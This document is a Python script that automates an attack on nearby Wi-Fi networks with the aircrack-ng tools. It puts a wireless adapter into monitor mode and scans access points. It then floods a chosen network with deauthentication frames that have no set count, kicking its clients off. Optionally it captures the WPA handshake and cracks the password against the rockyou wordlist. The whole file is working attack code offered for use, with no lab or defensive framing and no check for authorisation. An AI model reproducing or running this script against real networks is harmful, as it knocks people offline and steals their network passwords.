#!/usr/bin/env python3

import subprocess
import re
import csv
import os
import time
import shutil
from datetime import datetime

active_wireless_networks = []

def check_for_essid(essid, lst):
    if len(lst) == 0:
        return True
    for item in lst:
        if essid in item["ESSID"]:
            return False
    return True

if not 'SUDO_UID' in os.environ.keys():
    print("Run this program with sudo.")
    exit()

for file_name in os.listdir():
    if ".csv" in file_name:
        directory = os.getcwd()
        try:
            os.mkdir(directory + "/backup/")
        except:
            pass
        timestamp = datetime.now()
        shutil.move(file_name, f"{directory}/backup/{timestamp}-{file_name}")

wlan_pattern = re.compile("^wlan[0-9]+")
check_wifi_result = wlan_pattern.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())

if len(check_wifi_result) == 0:
    print("Connect a WiFi controller and try again.")
    exit()

print("Available WiFi interfaces:")
for index, item in enumerate(check_wifi_result):
    print(f"{index} - {item}")

while True:
    wifi_interface_choice = input("Select the interface for the attack: ")
    try:
        if check_wifi_result[int(wifi_interface_choice)]:
            break
    except:
        print("Enter a valid number.")

hacknic = check_wifi_result[int(wifi_interface_choice)]

print("WiFi adapter connected! Killing conflicting processes...")
subprocess.run(["sudo", "airmon-ng", "check", "kill"])
print("Putting WiFi adapter into monitored mode:")
subprocess.run(["sudo", "airmon-ng", "start", hacknic])

discover_access_points = subprocess.Popen(
    ["sudo", "airodump-ng", "-w", "file", "--write-interval", "1", "--output-format", "csv", hacknic + "mon"],
    stdout=subprocess.DEVNULL,
    stderr=subprocess.DEVNULL,
)

try:
    while True:
        subprocess.call("clear", shell=True)
        for file_name in os.listdir():
            if ".csv" in file_name:
                fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher',
                              'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
                with open(file_name) as csv_h:
                    csv_h.seek(0)
                    csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
                    for row in csv_reader:
                        if row["BSSID"] == "BSSID":
                            pass
                        elif row["BSSID"] == "Station MAC":
                            break
                        elif check_for_essid(row["ESSID"], active_wireless_networks):
                            active_wireless_networks.append(row)

        print("Scanning. Press Ctrl+C to select a network.\n")
        print("No |\tBSSID              |\tChannel|\tESSID")
        for index, item in enumerate(active_wireless_networks):
            print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")
        time.sleep(1)
except KeyboardInterrupt:
    pass

while True:
    choice = input("Select a network: ")
    try:
        if active_wireless_networks[int(choice)]:
            break
    except:
        print("Try again.")

hackbssid = active_wireless_networks[int(choice)]["BSSID"]
hackchannel = active_wireless_networks[int(choice)]["channel"].strip()
# Ask user for action
while True:
    attack_choice = input("Do you want to (1) De-authenticate only or (2) De-authenticate and crack the password? [1/2]: ")
    if attack_choice in ["1", "2"]:
        break
    print("Invalid choice. Enter 1 or 2.")

print(f"Starting airodump-ng on channel {hackchannel} targeting BSSID {hackbssid}.")
airodump_process = subprocess.Popen(
    ["sudo", "airodump-ng", "--bssid", hackbssid, "--channel", hackchannel, "-w", "file", hacknic + "mon"],
    stdout=subprocess.DEVNULL,
    stderr=subprocess.DEVNULL,
)

time.sleep(5)  # Let airodump collect initial data

print("Launching de-authentication attack for 1 minute...")
subprocess.Popen(
    [
        "x-terminal-emulator", "-e", 
        f"bash -c 'sudo aireplay-ng --deauth 0 -a {hackbssid} {hacknic}mon; exec bash'"
    ]
)

time.sleep(60)  # Allow de-auth attack to persist for 1 minute
airodump_process.terminate()

if attack_choice == "1":
    print("De-authentication attack completed. Exiting program.")
    exit()

print("Proceeding to crack the Wi-Fi password...")
wordlist_path = "/usr/share/wordlists/rockyou.txt"
if not os.path.exists(wordlist_path):
    print(f"Wordlist not found at {wordlist_path}. Please ensure rockyou.txt is available.")
    exit()

aircrack_command = ["sudo", "aircrack-ng", "-w", wordlist_path, "file-01.cap"]
aircrack_result = subprocess.run(aircrack_command, capture_output=True, text=True)

# Extract and display password if found
password_match = re.search(r"KEY FOUND! \[ (.+) \]", aircrack_result.stdout)
if password_match:
    cracked_password = password_match.group(1)
    print("\033[92m" + "="*40)
    print(f"Password Cracked: {cracked_password}")
    print("="*40 + "\033[0m")
else:
    print("Password not found. Try using a different wordlist.")

print("Restoring Wi-Fi adapter to managed mode...")
subprocess.run(["sudo", "airmon-ng", "stop", hacknic + "mon"])

# Verify the mode change
iwconfig_result = subprocess.run(["iwconfig"], capture_output=True, text=True).stdout
if hacknic in iwconfig_result:
    print(f"{hacknic} is now in managed mode.")
else:
    print(f"Failed to restore {hacknic} to managed mode. Please check manually.")

